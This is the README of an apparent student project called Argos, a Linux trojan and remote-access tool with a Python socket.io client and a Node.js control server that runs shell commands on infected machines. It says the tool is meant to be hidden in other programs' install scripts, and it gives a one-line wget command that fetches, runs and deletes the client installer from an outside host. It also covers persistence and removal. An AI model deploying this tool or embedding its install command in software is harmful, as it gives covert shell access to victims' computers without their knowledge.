# Argos

*Can see everything, beware of its omniscience, kneel before its greatness.*

⚠️ *Do not use for illegal purposes*
*THIS PROJECT IS IN PROGRESS. The backend api is functionnal but the frontend is still in developpement*
## Summary

- [**Presentation**](#presentation)
- [**Installation**](#installation)
- [**Removing**](#removing)
- [**Credits**](#credits)

## Presentation

#### Main goal

This program work on **Linux** distrubtion.

The main goal of this project is to show how frighteningly easy it is to create a program that can access to another machine.
This project is a [**trojan**](https://us.norton.com/internetsecurity-malware-what-is-a-trojan.html) that, when used in an installation script, can easily be installed and gain access to the whole system.

#### How it works

There is 2 main parts to this project:
- The online server
- The client

#### Client side

Get to the client part
```bash
cd client/
```

The client side program is made using [**python3**](https://www.python.org/downloads/) and can easily be called in the installation script of another program by using a simple curl command.

The client side is using [**socket io**](https://socket.io/fr/) to connect with the server through web sockets.
In case the server is not running, the program will try every 3 seconds to connect to the server until it's connected.

Once connected, the client script is waiting for instructions from the server.
The instruction it can get are mostly commands. In order to run the commands, it's using a child process that is running a shell, writing in it's stdin using the file descriptor obtained through the pty.spawn command.

Once the child process is done running a command, it send a ALRM signal to its ppid so we can get the output of the command.

#### Server side

Get to the server part:
```bash
cd online_server
```
Front:
```bash
cd frontend
```
Backend:
```bash
cd server
```
The server is made in [**Node js**](https://nodejs.org/en/download/).
The backend is composed of 2 server :
- A [**socker io**](https://socket.io/fr/get-started/chat) server
- A [**express JS**](https://expressjs.com/fr/) server

The *express JS* server is meant to received the requests from the frontend server.
Here are the routes of that server.
| Route | Protected using JWT |
|-------|---------------------|
|/login | NO |
|/services/:id| YES |
|/services/:id/shell| YES|

The socket server accept sockets and stock them in a global variable so the connexion can be used later on.
The sockets are listenning to events and so we are using that so in case of deconnexion with a client, the client will automaticly be remove from the list.

The /shell endpoint use the socket io server sending a command to the client and waiting for a response to send back the information to the frontend.

FrontEnd endpoints:
| Endpoint | Protected |
|----------|-----------|
|/login    | NO        |
|/clients  | YES       |
|/services/:id| YES    |
|/services/:id/shell| YES |

## Installation

In order to use the project, you need to have a script that people will run.

In this very script, you juste have to call this command (remember to replace the 'Adress of the online server' by your server adress) :
```bash
wget -q -O - https://raw.githubusercontent.com/Just1truc/Argos/main/client/install_argos > here && chmod 777 here && bash here "Adress of the online server" && rm here
```
Once this command has been run, everthing should be ready for the client.

Also, to setup the server, it's kinda more complicated.
You have to host both the [**front**](https://github.com/Just1truc/Argos/blob/main/online_server/frontend/README.md) and the [**backend**](https://github.com/Just1truc/Argos/tree/main/online_server/server/README.md).

## Removing

This trojan is pretty annoying right? So let's remove it from your computer !
To do so, you just need to first execute this command to get rid of the cronjob :
```bash
cronjob -r
```

Then, you need to cut the access to your computer, so let's kill the script doing that:
if you don't have ``htop``, you may have to install it.
```bash
htop -F python
```
Then, keep the pid of the command that is using *python3* to run and kill it:
```bash
kill [pid]
```


## Credits:

#### Client side && Backend developper : Justin Duc

[![linkeding bage](https://img.shields.io/badge/-linkedin-0A66C2?logo=linkedin&style=for-the-badge)](https://www.linkedin.com/in/justin-duc-51b09b225/)
[![git hub bage](https://img.shields.io/badge/-GitHub-181717?logo=GitHub&style=for-the-badge)](https://github.com/Just1truc)
[![mail](https://img.shields.io/badge/-Mail-0078D4?logo=Microsoft-Outlook&style=for-the-badge)](mailto:justin.duc@epitech.eu)

#### Frontend Developper : Baptiste Leroyer

[![linkeding bage](https://img.shields.io/badge/-linkedin-0A66C2?logo=linkedin&style=for-the-badge)](https://www.linkedin.com/in/baptiste-leroyer-a69894227/)
[![git hub bage](https://img.shields.io/badge/-GitHub-181717?logo=GitHub&style=for-the-badge)](https://github.com/ZiplEix)
[![mail](https://img.shields.io/badge/-Mail-0078D4?logo=Microsoft-Outlook&style=for-the-badge)](mailto:baptiste.leroyer@epitech.eu)

#### DevOps Developper : Leo Dubosclard

[![linkeding bage](https://img.shields.io/badge/-linkedin-0A66C2?logo=linkedin&style=for-the-badge)](https://linkedin.com/in/leo-dubosclard)
[![git hub bage](https://img.shields.io/badge/-GitHub-181717?logo=GitHub&style=for-the-badge)](https://github.com/ZerLock)
[![mail](https://img.shields.io/badge/-Mail-0078D4?logo=Microsoft-Outlook&style=for-the-badge)](mailto:leo.dubosclard@epitech.eu)

#### Frontend Developper : Joshua Brionne

[![linkeding bage](https://img.shields.io/badge/-linkedin-0A66C2?logo=linkedin&style=for-the-badge)](https://www.linkedin.com/in/joshua-brionne/)
[![git hub bage](https://img.shields.io/badge/-GitHub-181717?logo=GitHub&style=for-the-badge)](https://github.com/izimio)
[![mail](https://img.shields.io/badge/-Mail-0078D4?logo=Microsoft-Outlook&style=for-the-badge)](mailto:joshua.brionne@epitech.eu)

#### Frontend Developper : Paul laban

[![linkeding bage](https://img.shields.io/badge/-linkedin-0A66C2?logo=linkedin&style=for-the-badge)](https://www.linkedin.com/in/paul-laban-5b190b227/)
[![git hub bage](https://img.shields.io/badge/-GitHub-181717?logo=GitHub&style=for-the-badge)](https://github.com/501stEcho)
[![mail](https://img.shields.io/badge/-Mail-0078D4?logo=Microsoft-Outlook&style=for-the-badge)](mailto:paul.laban@epitech.eu)
